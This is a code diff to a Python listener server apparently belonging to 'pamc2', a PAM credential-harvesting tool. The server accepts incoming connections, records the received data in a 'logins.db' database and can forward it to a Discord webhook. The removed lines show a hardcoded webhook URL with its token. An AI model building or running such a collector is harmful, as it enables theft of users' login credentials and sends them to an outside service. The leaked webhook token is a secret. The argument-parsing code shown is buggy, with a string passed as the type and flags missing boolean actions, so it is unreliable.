@@ -1,10 +1,19 @@
+import os
 import socket
 import sqlite3
+import argparse
 import requests
 import threading
+from dotenv import load_dotenv
 
-PORT = 5000
-WEBHOOK_URL = "https://discord.com/api/webhooks/1344473763550461972/JGeTQsADKvDzdl-fn6MmNgHIJ_xPz05CHxone7_8Eq6iaI3WqfCWTSowFse4QE6du8B5"
+def server_args():
+    parser = argparse.ArgumentParser(description="Server meant for use with pamc2")
+    parser.add_argument('-p', '--port', metavar="<LISTENING PORT>", help="Port number to listen on (default 5000)", 
+                        type="int", dest="port", action="store", default="5000")
+    parser.add_argument('--discord', help="Enable Discord Webhook (set WEBHOOK_URL env var)")
+    parser.add_argument('--minimal', help="Only print updates")
+    parser.add_argument('--nodb', help="Run the server without utilizing the database")
+    return parser.parse_args()
 
 def send_discord(addr, data):
     hook_data = {
@@ -17,7 +26,7 @@ def send_discord(addr, data):
         }]
     }
 
-    response = requests.post(WEBHOOK_URL, json=hook_data)
+    response = requests.post(os.getenv('WEBHOOK_URL'), json=hook_data)
 
 def write_db(addr, data):
     conn = sqlite3.connect('logins.db')
@@ -86,30 +95,42 @@ def write_db(addr, data):
     conn.commit()
     conn.close()
 
-def handle_client(lock, c, addr):
+def handle_client(lock, c, addr, cmd_args):
     data = c.recv(1024).decode()
     print(f"Received from {addr} - {data}")
 
     lock.acquire()
-    write_db(addr, data)
-    send_discord(addr, data)
+
+    if (not cmd_args.nodb):
+        write_db(addr, data)
+
+    if (cmd_args.discord):
+        send_discord(addr, data)
+    
     lock.release()
 
     c.close()
 
 def main():
+    load_dotenv()
+    cmd_args = server_args()
+
+    if (cmd_args.discord and not os.getenv("WEBHOOK_URL")):
+        print("You must set a WEBHOOK_URL environment variable to use --discord! Please either create a .env file with the WEBHOOK_URL or set the environment variable globally to use this setting.")
+        exit(1)
+
     server_socket = socket.socket()
     print("Created socket")
 
-    server_socket.bind(('', PORT))
+    server_socket.bind(('', cmd_args.port))
     server_socket.listen()
-    print(f"Server listening for incoming connections on port {PORT}...")
+    print(f"Server listening for incoming connections on port {cmd_args.port}...")
 
     lock = threading.Lock()
 
     while True:
         client_socket, addr = server_socket.accept()
-        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr))
+        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr,cmd_args))
         client_thread.start()
 
 # def main():
